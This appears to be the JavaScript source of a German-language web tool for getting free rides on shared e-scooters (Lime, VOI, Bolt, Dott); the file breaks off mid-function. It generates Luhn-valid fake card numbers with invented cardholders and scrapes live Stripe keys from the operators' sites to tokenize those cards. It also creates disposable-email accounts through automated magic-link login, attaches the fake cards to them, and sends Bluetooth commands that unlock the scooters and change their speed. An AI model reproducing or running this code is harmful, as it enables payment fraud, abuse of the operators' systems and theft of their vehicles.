"use strict";

/* ══════════════ GRUNDLAGEN ══════════════ */

const WORKER = "https://withered-dream-e5b5.timokrell09.workers.dev/?url=";
const PREIS_MIN = 0.0019;
const APP_VER = "3.248.1";
const DROSSEL = 140;

const $ = id => document.getElementById(id);
const setz = (id, t) => { const e = $(id); if(e) e.textContent = t };
const money = c => (c / 100).toFixed(2).replace(".", ",") + " €";
const zufall = n => Math.floor(Math.random() * n);
const sleep = ms => new Promise(r => setTimeout(r, ms));
const cut = (s, n) => String(s === undefined || s === null ? "" : s).slice(0, n);
const err = e => (e && e.message) ? e.message : String(e);

const S = {
  brand:"lime", karten:[], akte:null, grenze:500, tempo:20,
  geraet:null, schreib:null, melde:null, akku:null, gesperrt:true, fahrt:null,
  pks:{}, gesehen:{}, block:[], lenker:"", qr:"", seq:1, letzteAnfrage:0, laeuft:false
};

function lade(){
  try{
    const r = JSON.parse(localStorage.getItem("rk_ultra") || "{}");
    S.karten = Array.isArray(r.karten)
      ? r.karten.filter(k => k && k.num && k.hal && k.cvv && k.monat && k.jahr) : [];
    S.akte = r.akte || null;
    S.grenze = typeof r.grenze === "number" && r.grenze >= 100 ? r.grenze : 500;
    S.tempo = typeof r.tempo === "number" ? r.tempo : 20;
    S.brand = (r.brand && V[r.brand]) ? r.brand : "lime";
    S.gesehen = r.gesehen || {};
    S.block = Array.isArray(r.block) ? r.block : [];
    S.lenker = r.lenker || "";
  }catch(_){}
}

function speichere(){
  try{
    localStorage.setItem("rk_ultra", JSON.stringify({
      karten:S.karten, akte:S.akte, grenze:S.grenze, tempo:S.tempo,
      brand:S.brand, gesehen:S.gesehen, block:S.block, lenker:S.lenker
    }));
  }catch(_){}
}

/* ══════════════ ANZEIGE ══════════════ */

function log(t, k){
  const l = $("log"); if(!l) return;
  const d = document.createElement("div");
  d.className = k || "";
  d.textContent = new Date().toLocaleTimeString("de-DE") + " · " + t;
  l.appendChild(d);
  l.scrollTop = l.scrollHeight;
  while(l.childNodes.length > 400) l.removeChild(l.firstChild);
}

function stat(t, k){
  const s = $("status"); if(!s) return;
  s.textContent = t;
  s.className = k || "";
  log(t, k === "err" ? "e" : k === "ok" ? "g" : k === "warn" ? "y" : "");
}

function karteStat(t){ const s = $("statusKarte"); if(s) s.textContent = t || "" }

function ampel(art, txt){
  ["l1","l2","l3","l4"].forEach(id => { const e = $(id); if(e) e.className = "" });
  const m = { rot:"l1", gelb:"l2", gruen:"l3", blau:"l4" };
  const e = $(m[art]); if(e) e.className = art;
  if(txt) stat(txt, art === "rot" ? "err" : art === "gelb" ? "warn" : art === "gruen" ? "ok" : "");
}

/* ══════════════ NETZ ══════════════ */

const CORS_FREI = /(^|\.)(stripe\.com|mail\.tm|mail\.gw|guerrillamail\.com|catchmail\.io)$/;
const PROXIES = [
  u => "https://api.allorigins.win/raw?url=" + encodeURIComponent(u),
  u => "https://corsmirror.com/v1?url=" + encodeURIComponent(u),
  u => "https://api.codetabs.com/v1/proxy?quest=" + encodeURIComponent(u),
  u => "https://api.cors.lol/?url=" + encodeURIComponent(u)
];

function direktFrei(u){
  try{ return CORS_FREI.test(new URL(u).hostname) }catch(_){ return false }
}

async function bremse(){
  const warte = DROSSEL - (Date.now() - S.letzteAnfrage);
  if(warte > 0) await sleep(warte);
  S.letzteAnfrage = Date.now();
}

/* 429 und 5xx sind Wegprobleme. Leere Antworten (204) sind gültig.
   Kein Selbstaufruf mehr – zwei Durchgänge in einer Schleife. */
async function netz(u, opt){
  const o = opt || {};
  let letzter = null;

  for(let durchgang = 0; durchgang < 2; durchgang++){
    const wegen = [];
    if(direktFrei(u)) wegen.push({ n:"direkt", f:u, bonus:100 });
    wegen.push({ n:"worker", f:WORKER + encodeURIComponent(u), bonus:0 });
    PROXIES.forEach((p, i) => wegen.push({ n:"p" + i, f:p(u), bonus:0 }));
    wegen.sort((a, b) => ((S.gesehen[b.n] || 0) + b.bonus) - ((S.gesehen[a.n] || 0) + a.bonus));

    let probiert = 0, letzte429 = null;

    for(const w of wegen){
      if((S.gesehen[w.n] || 0) <= -2) continue;
      probiert++;
      await bremse();
      const ab = new AbortController();
      const zeit = setTimeout(() => ab.abort(), 15000);
      try{
        const r = await fetch(w.f, {
          method:o.method || "GET", headers:o.headers || {}, body:o.body,
          cache:"no-store", redirect:"follow", signal:ab.signal
        });
        const t = await r.text();
        clearTimeout(zeit);
        if(r.status === 429){
          S.gesehen[w.n] = (S.gesehen[w.n] || 0) - 2;
          letzte429 = { ok:false, status:429, text:t, weg:w.n };
          continue;
        }
        if(r.status >= 500){
          S.gesehen[w.n] = (S.gesehen[w.n] || 0) - 2;
          letzter = new Error("HTTP " + r.status);
          continue;
        }
        S.gesehen[w.n] = (S.gesehen[w.n] || 0) + 1;
        speichere();
        return { ok:r.ok, status:r.status, text:t, weg:w.n };
      }catch(e){
        clearTimeout(zeit);
        letzter = e;
        S.gesehen[w.n] = (S.gesehen[w.n] || 0) - 1;
      }
    }
    if(letzte429) return letzte429;
    if(probiert) break;
    S.gesehen = {};
    speichere();
  }
  throw letzter || new Error("Netz tot");
}

async function netzJson(u, opt){
  const r = await netz(u, opt);
  if(!r.text) return { ok:r.ok, status:r.status, daten:null };
  let d = null;
  try{ d = JSON.parse(r.text) }catch(_){
    if(r.ok) throw new Error("Antwort unlesbar");
    return { ok:false, status:r.status, daten:null };
  }
  return { ok:r.ok, status:r.status, daten:d };
}

/* ══════════════ MARKEN ══════════════ */

const V = {
  lime:{
    label:"LIME", base:"https://web-production.lime.bike/api/rider",
    max:27, modell:"Gen4.1, 350 W", proto:"lime", pks:["https://www.li.me/","https://www.lime.bike/"],
    filter:[{ namePrefix:"lime-" }, { namePrefix:"Lime-" }]
  },
  voi:{
    label:"VOI", base:"https://api.voiapp.io",
    max:30, modell:"Voiager 4, 350 W, Okai-AT", proto:"okai", pks:["https://www.voi.com/"],
    filter:[{ namePrefix:"voi" }, { namePrefix:"VOI" }, { namePrefix:"ES" }]
  },
  bolt:{
    label:"BOLT", base:"https://api.bolt.eu",
    max:31, modell:"Ninebot-Basis, 350 W, Okai-AT", proto:"okai", pks:["https://bolt.eu/"],
    filter:[{ namePrefix:"Bolt" }, { namePrefix:"bolt" }]
  },
  dott:{
    label:"DOTT", base:"https://api.dott.eu",
    max:28, modell:"Okai-Basis, 350 W, Okai-AT", proto:"okai", pks:["https://ridedott.com/"],
    filter:[{ namePrefix:"dott" }, { namePrefix:"Dott" }, { namePrefix:"OKAI" }]
  }
};

function stufe(kmh){ return Math.min(3, Math.max(1, Math.ceil(kmh / 8))) }

/* ══════════════ KARTE ══════════════ */

const ARTEN = [
  { bin:"492900", typ:"VISA",       laenge:16, cvv:3 },
  { bin:"492940", typ:"VISA",       laenge:16, cvv:3 },
  { bin:"415000", typ:"VISA",       laenge:16, cvv:3 },
  { bin:"453176", typ:"VISA",       laenge:16, cvv:3 },
  { bin:"403300", typ:"VISA",       laenge:16, cvv:3 },
  { bin:"426100", typ:"VISA",       laenge:16, cvv:3 },
  { bin:"448500", typ:"VISA",       laenge:16, cvv:3 },
  { bin:"476100", typ:"VISA",       laenge:16, cvv:3 },
  { bin:"459100", typ:"VISA",       laenge:16, cvv:3 },
  { bin:"522100", typ:"MASTERCARD", laenge:16, cvv:3 },
  { bin:"545400", typ:"MASTERCARD", laenge:16, cvv:3 },
  { bin:"543200", typ:"MASTERCARD", laenge:16, cvv:3 },
  { bin:"511100", typ:"MASTERCARD", laenge:16, cvv:3 },
  { bin:"540400", typ:"MASTERCARD", laenge:16, cvv:3 },
  { bin:"553200", typ:"MASTERCARD", laenge:16, cvv:3 },
  { bin:"378282", typ:"AMEX",       laenge:15, cvv:4 },
  { bin:"371449", typ:"AMEX",       laenge:15, cvv:4 }
];

const PERSONEN = [
  { n:"Luca Moretti",      plz:"20121",  ort:"Mailand",     land:"IT" },
  { n:"Giulia Ferraro",    plz:"00184",  ort:"Rom",         land:"IT" },
  { n:"Mateo Álvarez",     plz:"28013",  ort:"Madrid",      land:"ES" },
  { n:"Lucía Ferrer",      plz:"08001",  ort:"Barcelona",   land:"ES" },
  { n:"Hugo Lefèvre",      plz:"75011",  ort:"Paris",       land:"FR" },
  { n:"Camille Roux",      plz:"69003",  ort:"Lyon",        land:"FR" },
  { n:"Daan de Vries",     plz:"1012",   ort:"Amsterdam",   land:"NL" },
  { n:"Sanne Bakker",      plz:"3011",   ort:"Rotterdam",   land:"NL" },
  { n:"Jonas Lindqvist",   plz:"111 22", ort:"Stockholm",   land:"SE" },
  { n:"Elin Sandberg",     plz:"411 03", ort:"Göteborg",    land:"SE" },
  { n:"Oliver Bennett",    plz:"EC1A",   ort:"London",      land:"GB" },
  { n:"Chloe Whitfield",   plz:"M1 4BT", ort:"Manchester",  land:"GB" },
  { n:"Sean O'Connell",    plz:"D02",    ort:"Dublin",      land:"IE" },
  { n:"Aoife Byrne",       plz:"T12",    ort:"Cork",        land:"IE" },
  { n:"Marek Kowalski",    plz:"00-001", ort:"Warschau",    land:"PL" },
  { n:"Zofia Nowak",       plz:"31-001", ort:"Krakau",      land:"PL" },
  { n:"Pedro Almeida",     plz:"1000",   ort:"Lissabon",    land:"PT" },
  { n:"Inês Carvalho",     plz:"4000",   ort:"Porto",       land:"PT" },
  { n:"Rafael Souza",      plz:"01310",  ort:"São Paulo",   land:"BR" },
  { n:"Beatriz Lima",      plz:"20040",  ort:"Rio",         land:"BR" },
  { n:"Ethan Caldwell",    plz:"10001",  ort:"New York",    land:"US" },
  { n:"Maya Whitaker",     plz:"90012",  ort:"Los Angeles", land:"US" },
  { n:"Noah Tremblay",     plz:"H2X",    ort:"Montreal",    land:"CA" },
  { n:"Emma Gagnon",       plz:"V6B",    ort:"Vancouver",   land:"CA" },
  { n:"Lukas Brandt",      plz:"10115",  ort:"Berlin",      land:"DE" },
  { n:"Marie Hoffmann",    plz:"20095",  ort:"Hamburg",     land:"DE" },
  { n:"Tobias Reinhardt",  plz:"80331",  ort:"München",     land:"DE" },
  { n:"Sophie Krüger",     plz:"50667",  ort:"Köln",        land:"DE" },
  { n:"Niklas Vogt",       plz:"60311",  ort:"Frankfurt",   land:"DE" },
  { n:"Hannah Seidel",     plz:"70173",  ort:"Stuttgart",   land:"DE" },
  { n:"Felix Baumann",     plz:"40213",  ort:"Düsseldorf",  land:"DE" },
  { n:"Lea Mertens",       plz:"04109",  ort:"Leipzig",     land:"DE" },
  { n:"Julian Ebert",      plz:"01067",  ort:"Dresden",     land:"DE" },
  { n:"Amelie Wolf",       plz:"30159",  ort:"Hannover",    land:"DE" },
  { n:"Maximilian Roth",   plz:"90402",  ort:"Nürnberg",    land:"DE" },
  { n:"Clara Neumann",     plz:"28195",  ort:"Bremen",      land:"DE" },
  { n:"David Auer",        plz:"1010",   ort:"Wien",        land:"AT" },
  { n:"Sarah Pichler",     plz:"5020",   ort:"Salzburg",    land:"AT" },
  { n:"Florian Moser",     plz:"6020",   ort:"Innsbruck",   land:"AT" },
  { n:"Nina Berger",       plz:"8010",   ort:"Graz",        land:"AT" },
  { n:"Lars Meier",        plz:"8001",   ort:"Zürich",      land:"CH" },
  { n:"Elena Frei",        plz:"3001",   ort:"Bern",        land:"CH" },
  { n:"Marco Bianchi",     plz:"6900",   ort:"Lugano",      land:"CH" },
  { n:"Sofia Keller",      plz:"4001",   ort:"Basel",       land:"CH" }
];

function luhnZiffer(nr){
  let s = 0, dop = true;
  for(let i = nr.length - 1; i >= 0; i--){
    let d = +nr[i];
    if(dop){ d *= 2; if(d > 9) d -= 9 }
    s += d; dop = !dop;
  }
  return (10 - (s % 10)) % 10;
}

function luhnOk(nr){
  if(!/^\d{12,19}$/.test(nr)) return false;
  return luhnZiffer(nr.slice(0, -1)) === +nr.slice(-1);
}

function neueKarte(){
  const art = ARTEN[zufall(ARTEN.length)];
  const p = PERSONEN[zufall(PERSONEN.length)];
  let nr = art.bin;
  while(nr.length < art.laenge - 1) nr += zufall(10);
  nr += luhnZiffer(nr);
  let cvv = String(zufall(9) + 1);
  while(cvv.length < art.cvv) cvv += zufall(10);
  return {
    num:nr, monat:String(1 + zufall(12)).padStart(2, "0"),
    jahr:String(28 + zufall(5)), cvv,
    hal:p.n, plz:p.plz, ort:p.ort, land:p.land, typ:art.typ,
    pm:"", tok:"", ok:false, rest:S.grenze
  };
}

function aktuelleKarte(){ return S.karten[S.karten.length - 1] || null }

function cardPaint(c){
  if(!c || !c.num){
    setz("cNum", "•••• •••• •••• ••••");
    setz("cExp", "--/--"); setz("cCvv", "---"); setz("cHal", "–");
    setz("cTyp", "LEER"); setz("cAdr", "–"); setz("cLimit", money(S.grenze));
    return;
  }
  setz("cNum", String(c.num).replace(/(.{4})/g, "$1 ").trim());
  setz("cExp", (c.monat || "--") + "/" + (c.jahr || "--"));
  setz("cCvv", c.cvv || "---");
  setz("cHal", c.hal || "–");
  setz("cTyp", c.typ || "KARTE");
  setz("cAdr", (c.plz || "") + " " + (c.ort || "") + " · " + (c.land || ""));
  setz("cLimit", typeof c.rest === "number" ? money(c.rest) : money(S.grenze));
}

function wertSetzen(cent){
  if(!isFinite(cent) || cent < 100 || cent > 10000){
    karteStat("Wert zwischen 1 und 100 €.");
    return false;
  }
  S.grenze = Math.round(cent);
  const c = aktuelleKarte();
  if(c && !S.fahrt) c.rest = S.grenze;
  const f = $("iWert"); if(f) f.value = String(Math.round(S.grenze / 100));
  speichere(); malen();
  log("Wert je Karte: " + money(S.grenze), "g");
  karteStat("Wert gesetzt. Jetzt NEUE KARTE würfeln.");
  return true;
}

function kartenNeu(){
  if(S.fahrt) fahrtStoppen();
  const c = neueKarte();
  S.karten.push(c);
  while(S.karten.length > 6) S.karten.shift();
  speichere();
  cardPaint(c);
  malen();
  karteStat("Frisch gewürfelt: " + c.hal + ", " + c.plz + " " + c.ort + " · " + money(S.grenze));
  log("Neue Karte: " + c.typ + " …" + c.num.slice(-4) + " auf " + c.hal, "g");
  return c;
}

/* ══════════════ STRIPE ══════════════ */

async function getPk(brand){
  if(S.pks[brand]) return S.pks[brand];
  for(const s of (V[brand] || V.lime).pks){
    try{
      const r = await netz(s);
      const m = r.text.match(/pk_live_[A-Za-z0-9]{20,}/);
      if(m){ S.pks[brand] = m[0]; log("Schlüssel für " + brand + " da.", "g"); return m[0] }
    }catch(e){ log("Schlüsselsuche " + cut(s, 34) + ": " + err(e), "y") }
  }
  return "";
}

function stripeKopf(pk){
  return {
    "Authorization":"Basic " + btoa(pk + ":"),
    "Content-Type":"application/x-www-form-urlencoded"
  };
}

async function tokenize(c, brand){
  const pk = await getPk(brand);
  if(!pk) return { fehler:"kein Stripe-Schlüssel" };

  const felder = new URLSearchParams({
    type:"card",
    "card[number]":c.num, "card[exp_month]":c.monat, "card[exp_year]":c.jahr,
    "card[cvc]":c.cvv,
    "billing_details[name]":c.hal,
    "billing_details[address][postal_code]":c.plz || "10115",
    "billing_details[address][city]":c.ort || "Berlin",
    "billing_details[address][country]":c.land || "DE"
  });

  try{
    const r = await netzJson("https://api.stripe.com/v1/payment_methods",
      { method:"POST", headers:stripeKopf(pk), body:felder.toString() });
    if(r.ok && r.daten && r.daten.id) return { pm:r.daten.id };
    const grund = (r.daten && r.daten.error)
      ? (r.daten.error.message || r.daten.error.code) : ("HTTP " + r.status);

    const t = await netzJson("https://api.stripe.com/v1/tokens", {
      method:"POST", headers:stripeKopf(pk),
      body:new URLSearchParams({
        "card[number]":c.num, "card[exp_month]":c.monat, "card[exp_year]":c.jahr,
        "card[cvc]":c.cvv, "card[name]":c.hal
      }).toString()
    });
    if(t.ok && t.daten && t.daten.id) return { tok:t.daten.id };
    return { fehler:grund };
  }catch(e){ return { fehler:err(e) } }
}

async function pruefen(){
  const c = aktuelleKarte();
  if(!c){ karteStat("Keine Karte da."); return false }
  if(!luhnOk(c.num)){ karteStat("Prüfziffer rechnet nicht auf."); return false }
  if(!/^\d{3,4}$/.test(c.cvv)){ karteStat("CVC fehlt."); return false }
  karteStat("Stripe wird gefragt …");
  ampel("gelb", "Prüfe Karte …");
  const r = await tokenize(c, S.brand);
  if(r.pm || r.tok){
    c.pm = r.pm || ""; c.tok = r.tok || "";
    speichere(); cardPaint(c); malen();
    karteStat("Karte angenommen, Kennung liegt vor.");
    ampel("gruen", "Karte gültig.");
    return true;
  }
  karteStat("Abgelehnt: " + cut(r.fehler, 90));
  ampel("rot", "Karte abgelehnt.");
  return false;
}

/* ══════════════ POSTFÄCHER ══════════════ */

function grabToken(t){
  if(!t) return "";
  const s = String(t).replace(/&amp;/g, "&").replace(/\\\//g, "/");
  const m = s.match(/(?:magic_link_token|access_token|token)=([A-Za-z0-9._%~\-]{8,})/);
  if(!m) return "";
  let v = m[1];
  try{ v = decodeURIComponent(v) }catch(_){}
  return v.replace(/[.,;:)\]"'<>]+$/, "");
}

const CATCH_DOM = ["catchmail.io", "mailistry.com", "zeppost.com"];

const POSTFAECHER = [
  {
    n:"catchmail",
    async neu(){
      const frei = CATCH_DOM.filter(d => S.block.indexOf(d) < 0);
      const pool = frei.length ? frei : CATCH_DOM;
      const adr = "rk" + Date.now().toString(36) + zufall(900) + "@" + pool[zufall(pool.length)];
      const liste = () => netzJson(
        "https://api.catchmail.io/api/v1/mailbox?address=" + encodeURIComponent(adr));
      const p = await liste();
      if(!p.ok) throw new Error("HTTP " + p.status);
      return {
        adr,
        lesen: async () => {
          const r = await liste();
          const ms = (r.daten && r.daten.messages) || [];
          for(const m of ms.slice(0, 3)){
            await sleep(1100);
            const v = await netzJson("https://api.catchmail.io/api/v1/message/" +
              encodeURIComponent(m.id) + "?mailbox=" + encodeURIComponent(adr));
            const b = v.daten && v.daten.body;
            const tok = grabToken((b && (b.text || b.html)) || "");
            if(tok) return tok;
          }
          return "";
        }
      };
    }
  },
  {
    n:"mail.tm",
    async neu(){
      const d = await netzJson("https://api.mail.tm/domains");
      const liste = ((d.daten && d.daten["hydra:member"]) || [])
        .filter(x => x && x.domain && S.block.indexOf(x.domain) < 0);
      if(!liste.length) throw new Error("keine freie Domain");
      const dom = liste[zufall(liste.length)].domain;
      const adr = "rk" + Date.now().toString(36) + zufall(1000) + "@" + dom;
      const pw = "Rk" + Math.random().toString(36).slice(2, 12) + "!9";
      const r = await netzJson("https://api.mail.tm/accounts", {
        method:"POST", headers:{ "Content-Type":"application/json" },
        body:JSON.stringify({ address:adr, password:pw })
      });
      if(!r.ok) throw new Error("Anlage " + r.status);
      const t = await netzJson("https://api.mail.tm/token", {
        method:"POST", headers:{ "Content-Type":"application/json" },
        body:JSON.stringify({ address:adr, password:pw })
      });
      const jwt = t.daten && t.daten.token;
      if(!jwt) throw new Error("kein Token");
      return {
        adr,
        lesen: async () => {
          const m = await netzJson("https://api.mail.tm/messages",
            { headers:{ Authorization:"Bearer " + jwt } });
          const ids = ((m.daten && m.daten["hydra:member"]) || []).map(x => x.id);
          for(const id of ids.slice(0, 4)){
            const v = await netzJson("https://api.mail.tm/messages/" + id,
              { headers:{ Authorization:"Bearer " + jwt } });
            const tok = grabToken(JSON.stringify(v.daten || {}));
            if(tok) return tok;
          }
          return "";
        }
      };
    }
  },
  {
    n:"guerrilla",
    async neu(){
      const d = await netzJson("https://api.guerrillamail.com/ajax.php?f=get_email_address&lang=de");
      if(!d.ok || !d.daten || !d.daten.email_addr) throw new Error("HTTP " + d.status);
      const adr = d.daten.email_addr, sid = d.daten.sid_token;
      return {
        adr,
        lesen: async () => {
          const r = await netzJson(
            "https://api.guerrillamail.com/ajax.php?f=check_email&seq=0&sid_token=" + sid);
          const list = (r.daten && r.daten.list) || [];
          for(const m of list.slice(0, 3)){
            const v = await netzJson("https://api.guerrillamail.com/ajax.php?f=fetch_email&email_id=" +
              m.mail_id + "&sid_token=" + sid);
            const tok = grabToken((v.daten && v.daten.mail_body) || "");
            if(tok) return tok;
          }
          return "";
        }
      };
    }
  }
];

/* ══════════════ KONTO ══════════════ */

function uuid(){
  if(window.crypto && crypto.randomUUID) return crypto.randomUUID();
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, c => {
    const r = zufall(16);
    return (c === "x" ? r : (r & 0x3) | 0x8).toString(16);
  });
}

function appKopf(extra){
  return Object.assign({
    "Platform":"iOS",
    "App-Version":APP_VER,
    "Accept":"application/json"
  }, extra || {});
}

function auth(a){
  return appKopf({
    "Authorization":"Bearer " + (a.token || ""),
    "Content-Type":"application/json"
  });
}

async function magicLink(base, adr){
  const formen = [
    { art:"form", d:{ email:adr, user_agreement_country_code:"DE", user_agreement_version:"4" } },
    { art:"form", d:{ email:adr, user_agreement_country_code:"DE", user_agreement_version:"2" } },
    { art:"form", d:{ email:adr } },
    { art:"json", d:{ email:adr, user_agreement_country_code:"DE", user_agreement_version:4 } }
  ];
  for(let runde = 0; runde < 2; runde++){
    for(const f of formen){
      const r = await netzJson(base + "/v2/onboarding/magic-link", {
        method:"POST",
        headers:appKopf({ "Content-Type": f.art === "form"
          ? "application/x-www-form-urlencoded; charset=utf-8" : "application/json" }),
        body: f.art === "form" ? new URLSearchParams(f.d).toString() : JSON.stringify(f.d)
      });
      if(r.status === 429){ await sleep(9000); continue }
      if(r.ok) return true;
      log("magic-link " + f.art + " → " + r.status, "y");
      if(r.status === 400 || r.status === 422){
        const dom = adr.split("@")[1];
        if(S.block.indexOf(dom) < 0){ S.block.push(dom); speichere() }
      }
    }
  }
  return false;
}

async function kontoNeu(){
  const reihe = POSTFAECHER.slice().sort(() => Math.random() - 0.5);
  let fach = null, letzter = null;
  for(const m of reihe){
    try{ fach = await m.neu(); log("Postfach " + m.n + " steht: " + fach.adr, "g"); break }
    catch(e){ letzter = e; log("Postfach " + m.n + ": " + err(e), "y") }
  }
  if(!fach) throw new Error("kein Postfach (" + err(letzter) + ")");

  const base = (V[S.brand] || V.lime).base;
  const dt = uuid();

  if(!await magicLink(base, fach.adr)) throw new Error("magic-link abgelehnt");

  stat("Warte auf Mail …", "warn");
  let tok = "";
  for(let i = 0; i < 22 && !tok; i++){
    await sleep(2400 + zufall(900));
    tok = await fach.lesen().catch(() => "");
  }
  if(!tok) throw new Error("keine Mail angekommen");

  const formen = [
    { art:"form", d:{ magic_link_token:tok }, dt:false },
    { art:"form", d:{ token:tok },            dt:false },
    { art:"json", d:{ magic_link_token:tok }, dt:true  },
    { art:"json", d:{ token:tok },            dt:true  }
  ];
  let jwt = "", letzterLogin = "–";
  for(const f of formen){
    const kopf = appKopf({ "Content-Type": f.art === "form"
      ? "application/x-www-form-urlencoded; charset=utf-8" : "application/json" });
    if(f.dt) kopf["X-Device-Token"] = dt;
    const l = await netzJson(base + "/v2/onboarding/login", {
      method:"POST", headers:kopf,
      body: f.art === "form" ? new URLSearchParams(f.d).toString() : JSON.stringify(f.d)
    });
    if(l.status === 429){ await sleep(9000); continue }
    jwt = (l.daten && (l.daten.token || (l.daten.data && l.daten.data.token))) || "";
    if(jwt) break;
    letzterLogin = f.art + "/" + Object.keys(f.d)[0] + " → " + l.status;
    log("Login " + letzterLogin, "y");
  }
  if(!jwt) throw new Error("Login " + letzterLogin);

  S.akte = { mail:fach.adr, token:jwt, dt, b:S.brand };
  speichere();
  log("Konto steht: " + fach.adr, "g");
  return S.akte;
}

async function hinterlegen(){
  const a = S.akte, c = aktuelleKarte();
  if(!a) throw new Error("kein Konto");
  if(!c) throw new Error("keine Karte");
  if(!c.pm && !c.tok) throw new Error("Karte nicht geprüft");

  const base = (V[a.b] || V.lime).base;
  const pfade = ["/v1/payment_methods", "/v2/payment_methods", "/v1/payment_methods/attach"];
  const nutzlast = JSON.stringify({
    payment_method_id:c.pm || undefined,
    token:c.tok || undefined,
    is_default:true,
    billing_country_code:c.land,
    billing_postal_code:c.plz,
    billing_city:c.ort,
    billing_street_address:c.hal
  });
  let letzter = "–";

  for(const pfad of pfade){
    for(const m of ["POST", "PUT"]){
      try{
        const r = await netzJson(base + pfad, { method:m, headers:auth(a), body:nutzlast });
        if(r.ok){ c.ok = true; speichere(); malen(); return true }
        letzter = m + " " + pfad + " → " + r.status;
      }catch(e){ letzter = err(e) }
    }
  }
  throw new Error("Hinterlegen: " + letzter);
}

/* ══════════════ BLUETOOTH ══════════════ */

const LIME_DIENSTE = [0xffe5, 0xffe9, 0xfee7, 0xfee9, 0xfff0, 0xfe60];
const OKAI_DIENST = 0x2c00, OKAI_SCHREIB = 0x2c01, OKAI_MELDE = 0x2c03;
const ALLE = LIME_DIENSTE.concat([OKAI_DIENST]);

function crc16(bytes){
  let c = 0;
  for(const b of bytes){
    c ^= (b << 8) & 0xffff;
    for(let i = 0; i < 8; i++){
      c = (c & 0x8000) ? (((c << 1) ^ 0x1021) & 0xffff) : ((c << 1) & 0xffff);
    }
  }
  return c;
}

function rahmen(cmd, nutz){
  const p = nutz || [];
  const k = [0x46, 0x43, (cmd >> 8) & 0xff, cmd & 0xff,
             (p.length >> 8) & 0xff, p.length & 0xff].concat(p);
  const c = crc16(k);
  return new Uint8Array(k.concat([(c >> 8) & 0xff, c & 0xff]));
}

function okaiSatz(op, felder, pw){
  const f = (felder || []).concat([pw || "OKAIYLBT"]);
  return "AT+" + op + "=" + f.join(",") + "," +
    String(S.seq++).padStart(4, "0") + "$\r\n";
}

async function sende(u8){
  if(!S.schreib) throw new Error("kein Kanal");
  await S.schreib.writeValue(u8);
  await sleep(110);
}

async function sendeOkai(op, felder, pw){
  await sende(new TextEncoder().encode(okaiSatz(op, felder, pw)));
}

function passwort(){
  if(S.lenker) return S.lenker;
  const name = (S.geraet && S.geraet.name) || "";
  const m = name.match(/[0-9A-Fa-f]{8}/);
  return m ? m[0] : "";
}

async function verbinden(){
  if(!navigator.bluetooth) throw new Error("kein Web Bluetooth, Bluefy benutzen");
  const v = V[S.brand];
  S.geraet = null; S.schreib = null; S.melde = null; S.akku = null;
  malen();
  ampel("gelb", "Suche Roller …");

  let g = null;
  try{
    g = await navigator.bluetooth.requestDevice({ filters:v.filter, optionalServices:ALLE });
  }catch(_){
    g = await navigator.bluetooth.requestDevice({ acceptAllDevices:true, optionalServices:ALLE });
  }
  if(!g) throw new Error("nichts gewählt");

  S.geraet = g;
  g.addEventListener("gattserverdisconnected", () => {
    S.schreib = null; S.melde = null; S.geraet = null;
    malen(); ampel("rot", "Verbindung weg.");
  });

  stat("Verbinde …", "warn");
  const server = await g.gatt.connect();

  if(v.proto === "okai"){
    try{
      const s = await server.getPrimaryService(OKAI_DIENST);
      S.schreib = await s.getCharacteristic(OKAI_SCHREIB);
      try{ S.melde = await s.getCharacteristic(OKAI_MELDE) }catch(_){}
    }catch(_){ S.schreib = null }
  }

  if(!S.schreib){
    for(const d of LIME_DIENSTE){
      try{
        const s = await server.getPrimaryService(d);
        const chars = await s.getCharacteristics();
        S.schreib = chars.find(c => c.properties.write || c.properties.writeWithoutResponse) || null;
        S.melde = chars.find(c => c.properties.notify) || null;
        if(S.schreib) break;
      }catch(_){}
    }
  }
  if(!S.schreib) throw new Error("kein Schreibkanal gefunden");

  const melde = S.melde || S.schreib;
  try{ await melde.startNotifications() }catch(_){}
  melde.addEventListener("characteristicvaluechanged", lesen);

  malen();
  ampel("gruen", "Verbunden: " + (g.name || "Roller"));
  await handshake();
}

function lesen(ev){
  const d = new Uint8Array(ev.target.value.buffer);
  if(d[0] === 0x46 && d[1] === 0x58){
    if(d.length > 19) S.akku = d[19];
    if(d.length > 8 && $("cIst")) $("cIst").textContent = String(d[8]);
    malen();
    return;
  }
  const txt = new TextDecoder().decode(d).replace(/[^\x20-\x7e]/g, "");
  if(!txt) return;
  log("Roller: " + cut(txt, 60), "y");
  const bat = txt.match(/OKBCL=(\d+)/);
  if(bat){ S.akku = +bat[1]; malen() }
}

async function handshake(){
  const pw = passwort();
  try{
    if(V[S.brand].proto === "okai"){
      await sendeOkai("OKPWD", [pw || "00000000"]);
      await sendeOkai("OKXWM", ["0"], "OKAI_CAR");
    }else{
      await sende(rahmen(0x1114, []));
      await sende(rahmen(0x1101, [0x4c,0x49,0x4d,0x45,0x42,0x49,0x4b,0x45]));
      if(pw){
        await sende(new TextEncoder().encode(
          "AT+ATH," + pw + "," + Math.floor(Date.now() / 1000) + ",1,$"));
      }
    }
    log("Handshake gesendet (" + V[S.brand].proto + ", Kennung " + (pw || "keine") + ").", "g");
  }catch(e){ log("Handshake: " + err(e), "y") }
}

async function entsperren(){
  if(!S.schreib) throw new Error("erst verbinden");
  ampel("gelb", "Entsperre …");
  await handshake();
  if(V[S.brand].proto === "okai"){
    await sendeOkai("OKSCM", ["1"]);
  }else{
    await sende(rahmen(0x1661, [0xf1]));
    await sende(rahmen(0x1663, [0xf1]));
    await sende(rahmen(0x1613, [0xf1]));
  }
  S.gesperrt = false;
  await tempoSenden();
  malen();
  ampel("gruen", "Entsperrt.");
  if(!S.fahrt) fahrtStart();
}

async function sperren(){
  if(!S.schreib) throw new Error("kein Kanal");
  if(V[S.brand].proto === "okai") await sendeOkai("OKSCM", ["0"]);
  else{
    await sende(rahmen(0x1663, [0xf0]));
    await sende(rahmen(0x1613, [0xf0]));
  }
  S.gesperrt = true;
  malen();
  ampel("gelb", "Gesperrt.");
}

async function piepsen(){
  if(!S.schreib) throw new Error("kein Kanal");
  if(V[S.brand].proto === "okai") await sendeOkai("OKSCT", ["1"]);
  else await sende(rahmen(0x1663, [0xf2]));
  log("Signal gesendet.", "g");
}

async function licht(){
  if(!S.schreib) throw new Error("kein Kanal");
  if(V[S.brand].proto === "okai") await sendeOkai("OKATL", ["1"]);
  else await sende(rahmen(0x1662, [0xf1]));
  log("Lichtbefehl gesendet.", "g");
}

async function tempoSenden(){
  if(!S.schreib) return;
  const kmh = Math.round(S.tempo);
  if(V[S.brand].proto === "okai"){
    const st = stufe(kmh);
